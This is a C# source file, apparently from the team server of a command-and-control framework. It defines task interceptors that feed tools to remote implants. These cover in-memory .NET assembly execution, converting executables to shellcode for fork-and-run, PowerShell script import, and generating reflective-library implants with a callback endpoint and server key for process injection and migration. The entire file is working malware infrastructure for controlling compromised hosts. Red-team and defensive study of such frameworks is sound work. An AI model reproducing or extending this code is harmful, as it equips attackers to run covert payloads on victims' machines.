using System;
using System.Collections.Generic;
using System.IO;
using Common.Config;
using Common.Payload;
using Microsoft.Extensions.Configuration;
using Shared;
using TeamServer.Helper;
using TeamServer.Models;
using static Common.Payload.PayloadGenerator;

namespace TeamServer.Services
{

    [InjectableService]
    public interface ITaskInterceptionService
    {
        InterceptionResult Intercept(AgentTask task, Agent agent);
    }

    [InjectableServiceImplementation(typeof(ITaskInterceptionService))]
    public class TaskInterceptionService : ITaskInterceptionService
    {
        public List<TaskInterceptor> Interceptors { get; set; } = new List<TaskInterceptor>();

        private readonly IConfiguration _configuration;
        private readonly IToolsService _toolsService;
        public TaskInterceptionService(IToolsService toolService, IConfiguration configuration)
        {
            this._toolsService = toolService;
            this._configuration = configuration;

            this.Interceptors.Add(new InlineAssemblyInterceptor(this._toolsService));
            this.Interceptors.Add(new ExecutePEInterceptor(this._toolsService, this._configuration));
            this.Interceptors.Add(new PowerShellImportInterceptor(this._toolsService));
            this.Interceptors.Add(new MigrateInterceptor(this._toolsService, this._configuration));
        }

        public InterceptionResult Intercept(AgentTask task, Agent agent)
        {
            foreach (var interceptor in Interceptors)
            {
                if (task.CommandId == interceptor.CommandId)
                {
                    var result = interceptor.Intercept(task, agent);
                    if (!result.Success)
                        return result;
                }
            }
            return new InterceptionResult().Succeed();
        }
    }

    public class InterceptionResult
    {
        public bool Success { get; set; }
        public string Error { get; set; }
        public InterceptionResult Succeed()
        {
            this.Success = true;
            this.Error = string.Empty;
            return this;
        }

        public InterceptionResult Failed(string error)
        {
            this.Success = false;
            this.Error = error;
            return this;
        }
    }

    public abstract class TaskInterceptor
    {
        public abstract CommandId CommandId { get; }
        public abstract InterceptionResult Intercept(AgentTask task, Agent agent);

        public InterceptionResult Failed(string error)
        {
            return new InterceptionResult().Failed(error);
        }

        public InterceptionResult Succeed()
        {
            return new InterceptionResult().Succeed();
        }
    }

    public class InlineAssemblyInterceptor : TaskInterceptor
    {
        private readonly IToolsService _toolsService;
        public InlineAssemblyInterceptor(IToolsService toolService)
        {
            _toolsService = toolService;
        }
        public override CommandId CommandId { get => CommandId.Assembly; }

        public override InterceptionResult Intercept(AgentTask task, Agent agent)
        {
            if (!task.HasParameter(ParameterId.Name))
                return Failed("Missing tool name");
            var toolName = task.GetParameter<string>(ParameterId.Name);
            var tool = this._toolsService.GetTool(toolName, true);
            if (tool is null)
                return Failed($"Tool {toolName} was not found !");
            if (tool.Type != Common.APIModels.ToolType.DotNet)
                return Failed($"Tool {toolName} is not a .Net Executable !");
            task.Parameters.AddParameter(ParameterId.File, Convert.FromBase64String(tool.Data));
            return Succeed();
        }
    }

    public class ExecutePEInterceptor : TaskInterceptor
    {
        private readonly IToolsService _toolsService;
        private readonly IConfiguration _configuration;
        private FoldersConfig _folderConfig;
        private SpawnConfig _spawnConfig;
        public ExecutePEInterceptor(IToolsService toolService, IConfiguration configuration)
        {
            _toolsService = toolService;
            _configuration = configuration;

            this._folderConfig = _configuration.FoldersConfigs();
            this._spawnConfig = _configuration.SpawnConfigs();
        }
        public override CommandId CommandId { get => CommandId.ForkAndRun; }

        public override InterceptionResult Intercept(AgentTask task, Agent agent)
        {
            if (!task.HasParameter(ParameterId.Name))
                return Failed("Missing tool name");
            var toolName = task.GetParameter<string>(ParameterId.Name);
            var tool = this._toolsService.GetTool(toolName, true);
            if (tool is null)
                return Failed($"Tool {toolName} was not found !");
            if (tool.Type != Common.APIModels.ToolType.Exe && tool.Type != Common.APIModels.ToolType.DotNet)
                return Failed($"Tool {toolName} is not a valid Executable !");
            string tmpFilePath = this._folderConfig.NewTempFile();
            PayloadGenerator generator = new PayloadGenerator(this._folderConfig, this._spawnConfig);
            ExecuteResult result = null;
            if (tool.Type == Common.APIModels.ToolType.Exe)
                result = generator.GenerateBinForExe(_toolsService.GetToolPath(tool), tmpFilePath, agent.Metadata.Architecture == "x86", task.HasParameter(ParameterId.Parameters) ? task.GetParameter<string>(ParameterId.Parameters) : null);
            if (tool.Type == Common.APIModels.ToolType.DotNet)
                result = generator.GenerateBinForAssembly(_toolsService.GetToolPath(tool), tmpFilePath, agent.Metadata.Architecture == "x86", task.HasParameter(ParameterId.Parameters) ? task.GetParameter<string>(ParameterId.Parameters) : null);


            if (result.Result < 0)
                return Failed("Unable to generate ShellCode Data." + Environment.NewLine + result.Out);

            var data = File.ReadAllBytes(tmpFilePath);
            File.Delete(tmpFilePath);
            task.Parameters.AddParameter(ParameterId.File, data);
            return Succeed();
        }
    }

    public class PowerShellImportInterceptor : TaskInterceptor
    {
        private readonly IToolsService _toolsService;
        public PowerShellImportInterceptor(IToolsService toolService)
        {
            _toolsService = toolService;
        }
        public override CommandId CommandId { get => CommandId.PowershellImport; }

        public override InterceptionResult Intercept(AgentTask task, Agent agent)
        {
            if (!task.HasParameter(ParameterId.Name))
                return Failed("Missing tool name");
            var toolName = task.GetParameter<string>(ParameterId.Name);
            var tool = this._toolsService.GetTool(toolName, true);
            if (tool is null)
                return Failed($"Tool {toolName} was not found !");
            if (tool.Type != Common.APIModels.ToolType.PowerShell)
                return Failed($"Tool {toolName} is not a valid Powershell script !");
            task.Parameters.AddParameter(ParameterId.File, tool.Data);
            return Succeed();
        }
    }

    public class MigrateInterceptor : TaskInterceptor
    {
        private readonly IToolsService _toolsService;
        private readonly IConfiguration _configuration;
        private FoldersConfig _folderConfig;
        private SpawnConfig _spawnConfig;
        public MigrateInterceptor(IToolsService toolService, IConfiguration configuration)
        {
            _toolsService = toolService;
            _configuration = configuration;

            this._folderConfig = _configuration.FoldersConfigs();
            this._spawnConfig = _configuration.SpawnConfigs();
        }
        public override CommandId CommandId { get => CommandId.Inject; }

        public override InterceptionResult Intercept(AgentTask task, Agent agent)
        {
            if (!task.HasParameter(ParameterId.Name))
                task.Parameters.AddParameter(ParameterId.Name, "ReflectiveFunction");

            if (!task.HasParameter(ParameterId.Target))
                return Failed("Missing Target architecture");

            if (!task.HasParameter(ParameterId.Bind))
                return Failed("Missing Endpoint");

            PayloadGenerator generator = new PayloadGenerator(this._folderConfig, this._spawnConfig);
            ImplantConfig config = new ImplantConfig()
            {
                Architecture = task.GetParameter<string>(ParameterId.Target) == "x86" ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                Type = ImplantType.ReflectiveLibrary,
                ImplantName = Payload.GenerateName(),
                IsDebug = false,
                IsInjected = false,
                Endpoint = ConnexionUrl.FromString(task.GetParameter<string>(ParameterId.Bind)),
                ServerKey = _configuration.GetValue<string>("ServerKey")
            };

            string logs = string.Empty;
            generator.MessageSent += (sender, message) =>
            {
                logs += message.ToString() + Environment.NewLine;
            };
            var data = generator.GenerateImplant(config);

            if (data == null)
                return Failed("Unable to generate ShellCode Data." + Environment.NewLine + logs);

            task.Parameters.AddParameter(ParameterId.File, data);
            return Succeed();
        }
    }


}
